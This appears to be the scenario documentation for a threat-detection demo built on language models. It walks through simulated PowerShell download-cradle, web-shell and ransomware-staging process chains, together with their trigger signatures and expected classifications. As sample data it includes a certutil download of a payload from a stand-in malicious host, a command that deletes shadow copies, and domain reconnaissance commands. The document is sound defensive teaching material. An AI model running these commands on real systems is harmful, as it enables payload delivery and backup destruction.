# Scenario Reference

This document describes each of the four demo scenarios in detail: the real-world attack pattern each models, the exact process sequence that gets fed through the pipeline, which event fires the sensor, and what the pipeline is expected to produce.

For setup and running instructions, see [README.md](./README.md).

---

## How a scenario moves through the pipeline

Two sensing paths lead to the same pipeline. The default is Category 4.

```
Simulated event stream
        │
        ├─── Category 3 (--mode rules) ──────────────────────────────────────┐
        │    sensor/monitor.py                                                │
        │    Each event checked against TRIGGER_SIGNATURES (human-authored). │
        │    On match: triage_with_llm() (Haiku) confirms.                   │
        │    On confirmation: on_trigger(snapshot, all_events) fires.         │
        │    Report footer: "Initiated by: environment signal"               │
        │                                                                     │
        └─── Category 4 (--mode orchestrator, default) ──────────────────────┤
             sensor/orchestrator.py                                           │
             OrchestratorSession evaluates event window with Haiku.           │
             No pre-specified rules — reasons from general security knowledge. │
             Decides INVESTIGATE or CONTINUE.                                 │
             Sets its own next-check interval based on suspicion level.       │
             Report includes: ORCHESTRATOR DECISION block + reasoning trail.  │
                                                                              │
        ◀────────────────────────────────────────────────────────────────────┘
        │
        ▼
agent/graph.py            Five-node LangGraph pipeline (identical in both modes):
        │
        ├─ trigger_received    Logs the triggering process snapshot.
        ├─ monitor_activity    Formats raw event list into a readable process tree.
        ├─ analyze_sequence    ReAct agent (Sonnet) reasons over the tree.
        │                      Tools available: format_process_tree,
        │                      identify_attack_patterns, lookup_mitre_technique,
        │                      get_similar_threats
        ├─ classify_threat     Sonnet produces structured JSON verdict.
        └─ generate_report     Assembles the final formatted report.
        ▼
output/reports/           Report written to disk.
output/threat_history.json  Detection logged for future similarity search.
```

The normal scenario (N) has no trigger in either mode. Category 3: sensor stays silent. Category 4: orchestrator concludes CONTINUE (you can see its reasoning in the console output). In both cases `demo.py` runs the pipeline directly to demonstrate the BENIGN classification path.

---

## Scenario A: PowerShell Download Cradle

**Run:** `python demo.py --scenario A`

### What it models

A living-off-the-land (LOLBin) technique where an attacker chains built-in Windows executables to download and stage a payload. No custom malware binary is needed for the download stage — every process in the chain is a legitimate Windows tool. This makes the technique effective against application whitelisting and signature-based detection. It is one of the most documented initial access / execution chains in the wild.

The key indicators are not individual processes but the *combination*: an unusual parent spawning PowerShell with obfuscated arguments, followed immediately by a LOLBin making an outbound network request.

### Process sequence

```
[T+0s] explorer.exe       (pid 1234)   parent: —
       cmdline: explorer.exe

[T+1s] cmd.exe            (pid 5432)   parent: explorer.exe
       cmdline: cmd.exe /c

[T+2s] powershell.exe     (pid 6789)   parent: cmd.exe        ◀ TRIGGER
       cmdline: powershell.exe -EncodedCommand JABjACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQA...

[T+4s] certutil.exe       (pid 7890)   parent: powershell.exe
       cmdline: certutil.exe -urlcache -f http://malicious.example.com/payload.exe
                C:\Users\Public\payload.exe

[T+6s] certutil.exe       (pid 7890)   — network_connection
       detail: Outbound TCP connection to 203.0.113.99:80 (malicious.example.com)
```

### What fires the trigger

The sensor fires on `powershell.exe` appearing with `-EncodedCommand` in the command line:

```python
{"process": "powershell.exe", "cmdline_contains": "-EncodedCommand"}
```

`-EncodedCommand` (or its abbreviation `-enc`) accepts a Base64-encoded command string. It is a standard technique for hiding the actual PowerShell command from command-line logging and process monitoring tools. Legitimate administrative scripts occasionally use it, which is why the Haiku triage pass provides a second check before escalating to full analysis.

### Why the chain matters for detection

Each process in isolation is benign:
- `explorer.exe` is the Windows shell
- `cmd.exe` is a standard command interpreter
- `powershell.exe` is a standard scripting runtime
- `certutil.exe` is a certificate management utility

The chain `explorer → cmd → powershell -EncodedCommand → certutil -urlcache` is what makes this malicious. The parent-child sequence tells the story the command line alone does not. This is why process tree analysis — not just individual process monitoring — is the detection primitive that matters here.

### Expected output

```
THREAT CLASSIFICATION
---------------------
Level:      HIGH
Confidence: 0.92–0.96
Technique:  T1059.001 - Command and Scripting Interpreter: PowerShell
            T1105 - Ingress Tool Transfer
            T1027 - Obfuscated Files or Information
```

Recommended actions will include: isolate the host, capture memory for forensics, investigate the PowerShell command origin, check certutil download target against threat intel, and review for persistence mechanisms.

### MITRE ATT&CK techniques

| ID | Name | Why it applies |
|----|------|----------------|
| T1059.001 | Command and Scripting Interpreter: PowerShell | PowerShell with -EncodedCommand is the primary execution vehicle |
| T1105 | Ingress Tool Transfer | certutil -urlcache -f downloads a remote payload |
| T1027 | Obfuscated Files or Information | Base64 encoding hides the PowerShell command from logging |

---

## Scenario B: Web Shell Activity

**Run:** `python demo.py --scenario B`

### What it models

Post-exploitation activity following a web shell upload to a compromised IIS server. A web shell is a script (PHP, ASPX, JSP) uploaded to a web server that allows an attacker to execute OS commands through HTTP requests. The upload typically exploits a file upload vulnerability, a misconfigured server, or a vulnerable CMS plugin.

The detection signal here is not the web shell itself (which is a file, not a process) but what it *does* after installation: the IIS worker process (`w3wp.exe`) spawning interactive command shells. Web servers do not spawn `cmd.exe` in normal operation. When they do, it is a near-certain indicator of a web shell or similar server-side code execution vulnerability.

### Process sequence

```
[T+0s] w3wp.exe    (pid 5678)   parent: svchost.exe
       cmdline: c:\windows\system32\inetsrv\w3wp.exe -ap DefaultAppPool

[T+1s] cmd.exe     (pid 6543)   parent: w3wp.exe               ◀ TRIGGER
       cmdline: cmd.exe /c whoami

[T+3s] cmd.exe     (pid 6544)   parent: w3wp.exe               ◀ TRIGGER (repeat)
       cmdline: cmd.exe /c net user

[T+5s] cmd.exe     (pid 6545)   parent: w3wp.exe               ◀ TRIGGER (repeat)
       cmdline: cmd.exe /c ipconfig /all

[T+7s] cmd.exe     (pid 6546)   parent: w3wp.exe               ◀ TRIGGER (repeat)
       cmdline: cmd.exe /c net group "Domain Admins" /domain
```

### What fires the trigger

The sensor fires on the first `cmd.exe` spawned by `w3wp.exe`:

```python
{"parent": "w3wp.exe", "process": "cmd.exe"}
```

This is one of the highest-fidelity trigger signatures in the set. The false positive rate for IIS worker processes spawning interactive shells in legitimate operation is extremely low. The subsequent reconnaissance commands (`whoami`, `net user`, `ipconfig`, `net group`) are not needed to fire the trigger — the parent-child relationship alone is sufficient. They appear in the event stream and are included in the analysis, but detection begins at the first `cmd.exe`.

### The reconnaissance sequence tells the attacker's story

The command sequence after initial access follows a textbook post-exploitation pattern:
1. `whoami` — confirm execution context, identify what user the web server runs as
2. `net user` — enumerate local accounts
3. `ipconfig /all` — map the network, identify subnet, gateway, DNS servers
4. `net group "Domain Admins" /domain` — check if domain admin accounts are accessible

This is not random activity. It is a structured reconnaissance workflow aimed at answering: *who am I, what machines can I reach, and how far can I move laterally?*

### Expected output

```
THREAT CLASSIFICATION
---------------------
Level:      HIGH
Confidence: 0.94–0.98
Technique:  T1505.003 - Server Software Component: Web Shell
            T1059.003 - Command and Scripting Interpreter: Windows Command Shell
            T1033 - System Owner/User Discovery
            T1087 - Account Discovery
            T1016 - System Network Configuration Discovery
```

Recommended actions will include: isolate the IIS server, identify and remove the web shell, check for uploaded files in web directories, review IIS access logs for the HTTP request that invoked the shell, and audit for any credentials harvested during the reconnaissance window.

### MITRE ATT&CK techniques

| ID | Name | Why it applies |
|----|------|----------------|
| T1505.003 | Server Software Component: Web Shell | w3wp.exe spawning cmd.exe is the primary indicator |
| T1059.003 | Windows Command Shell | cmd.exe is the execution vehicle for all reconnaissance commands |
| T1033 | System Owner/User Discovery | `whoami` confirms code execution and identifies the process owner |
| T1087 | Account Discovery | `net user` and `net group` enumerate accounts for lateral movement planning |
| T1016 | System Network Configuration Discovery | `ipconfig /all` maps the network for lateral movement targeting |

---

## Scenario C: Ransomware Staging

**Run:** `python demo.py --scenario C`

### What it models

The pre-encryption phase of a ransomware attack. Modern ransomware operators follow a predictable staging sequence before beginning file encryption: destroy backups first, then encrypt. Destroying shadow copies (`vssadmin delete shadows /all /quiet`) is the single most reliable indicator that a ransomware payload is about to execute, because there is almost no legitimate reason for a non-administrative process launched from a temp directory to delete all volume shadow copies.

This scenario models `update.exe` — a common ransomware disguise using a plausible-sounding name — running through the full staging sequence.

### Process sequence

```
[T+0s] update.exe     (pid 8888)   parent: —
       cmdline: C:\Users\Public\AppData\Local\Temp\update.exe
       detail:  Unsigned binary — path: C:\Users\...\Temp\update.exe

[T+1s] vssadmin.exe   (pid 9001)   parent: update.exe          ◀ TRIGGER
       cmdline: vssadmin.exe delete shadows /all /quiet

[T+3s] update.exe     (pid 8888)   — file_rename
       detail: Mass rename: Desktop\*.* → Desktop\*.locked (47 files)

[T+4s] update.exe     (pid 8888)   — file_rename
       detail: Mass rename: Documents\*.* → Documents\*.locked (213 files)

[T+5s] update.exe     (pid 8888)   — file_rename
       detail: Mass rename: Downloads\*.* → Downloads\*.locked (89 files)

[T+6s] notepad.exe    (pid 9002)   parent: update.exe
       cmdline: notepad.exe C:\Users\Public\Desktop\README_DECRYPT.txt
```

### What fires the trigger

The sensor fires when `vssadmin.exe` appears with `delete shadows` in the command line:

```python
{"process": "vssadmin.exe", "cmdline_contains": "delete shadows"}
```

`vssadmin delete shadows /all /quiet` destroys all Windows Volume Shadow Copies — the built-in backup mechanism. Ransomware does this to prevent victims from restoring files without paying. This command is the most consistent pre-encryption indicator across ransomware families. In practice, detection at this point means the encryption has not started yet — response time is measured in seconds, not minutes.

### The staging sequence demonstrates the attacker's methodology

The event stream after `vssadmin` fires shows what happens next:
- **Mass renames with `.locked` extension** — file encryption in progress. 349 files across three directories in 3 seconds indicates automated bulk processing.
- **`notepad.exe` opening `README_DECRYPT.txt`** — the ransom note is displayed to the victim. This is the final stage. The attack is complete from the attacker's perspective.

The combination of shadow copy deletion before mass file modification is classified by security researchers as a near-certain ransomware indicator. The `/quiet` flag on `vssadmin` confirms deliberate evasion of user-visible prompts.

### Why the parent process matters

`update.exe` is unsigned and running from a temp directory. Legitimate Windows update processes are signed by Microsoft and run from `C:\Windows\System32\` or `C:\Windows\SoftwareDistribution\`. An unsigned `update.exe` in `C:\Users\Public\AppData\Local\Temp\` has no parent (launched from a browser download or a phishing attachment) and immediately spawns `vssadmin`. This parent-child context — unsigned temp binary → shadow copy deletion — is the threat pattern the analysis will emphasize.

### Expected output

```
THREAT CLASSIFICATION
---------------------
Level:      CRITICAL
Confidence: 0.97–0.99
Technique:  T1490 - Inhibit System Recovery
            T1486 - Data Encrypted for Impact
```

Recommended actions will include: immediately isolate the affected host from the network, do NOT restart (memory may contain encryption keys), check whether shadow copies were successfully deleted, identify the initial infection vector (likely phishing or drive-by download), and assess the blast radius across file shares and mapped drives.

### MITRE ATT&CK techniques

| ID | Name | Why it applies |
|----|------|----------------|
| T1490 | Inhibit System Recovery | `vssadmin delete shadows /all /quiet` destroys all VSS backups before encryption |
| T1486 | Data Encrypted for Impact | Mass rename to `.locked` is the encryption phase; 349 files in 3 seconds confirms automated bulk processing |

---

## Scenario N: Normal User Activity (Baseline)

**Run:** `python demo.py --scenario N`

### What it models

A representative sample of normal developer workstation activity: a browser session, an IDE with language server processes, and a dev script running. This scenario exists to verify two properties:

1. The sensor correctly stays silent — none of these events match any trigger signature.
2. The pipeline correctly classifies the activity as BENIGN when run directly.

A detection system that cannot reliably distinguish normal from malicious is not useful. The normal scenario is the baseline against which the malicious scenarios are evaluated.

### Process sequence

```
[T+0s]  explorer.exe    (pid 1234)   parent: —
        cmdline: explorer.exe

[T+1s]  chrome.exe      (pid 3456)   parent: explorer.exe
        cmdline: chrome.exe --no-sandbox

[T+2s]  chrome.exe      (pid 3457)   parent: chrome.exe
        detail: Renderer process (tab)

[T+2s]  chrome.exe      (pid 3458)   parent: chrome.exe
        detail: GPU process

[T+5s]  Code.exe        (pid 4500)   parent: explorer.exe
        cmdline: Code.exe /home/user/projects/myapp

[T+6s]  node.exe        (pid 4501)   parent: Code.exe
        cmdline: node.exe --max-old-space-size=4096 .../ms-python.python/pyls
        detail: VS Code Python language server

[T+10s] python.exe      (pid 5000)   parent: Code.exe
        cmdline: python.exe /home/user/projects/myapp/scripts/generate_report.py
```

### Why the sensor stays silent

None of these process relationships match any trigger signature:

- `explorer.exe → chrome.exe` is standard browser launch from the Windows shell
- `chrome.exe → chrome.exe` (renderer/GPU processes) is Chromium's sandboxed multi-process model
- `explorer.exe → Code.exe` is normal IDE launch
- `Code.exe → node.exe` is VS Code spawning its language server — every VS Code + Python install does this
- `Code.exe → python.exe` is a developer running a script from their IDE

No encoded commands. No LOLBin invocations. No web worker spawning shells. No shadow copy operations. The sensor processes all seven events and returns `False` — no trigger detected.

### Why `demo.py` runs the pipeline anyway

With no trigger, the normal scenario runs the pipeline directly (bypassing `watch_simulated`) to demonstrate the BENIGN classification path. This is important: a complete demo must show that the reasoning layer can say *no* as well as *yes*.

### Expected output

```
THREAT CLASSIFICATION
---------------------
Level:      BENIGN
Confidence: 0.95–0.99
Technique:  N/A
```

The analysis will note that all parent-child relationships are consistent with normal user activity, no LOLBin usage is present, and the process tree matches a developer workstation pattern. Recommended actions: no action needed.

---

## Adding your own scenario

The notebook (`cyber_sentinels_playground.ipynb`, Section 6) provides an interactive environment for defining and running custom scenarios. You can:

- Define any process sequence using the event dict schema
- Add new trigger signatures at runtime (`mon.TRIGGER_SIGNATURES.append(...)`)
- Run the full pipeline against your custom events

To make a scenario permanent, add it to `simulation/malicious.py` and register it in `demo.py`. See the README for the event dict schema and full extension instructions.
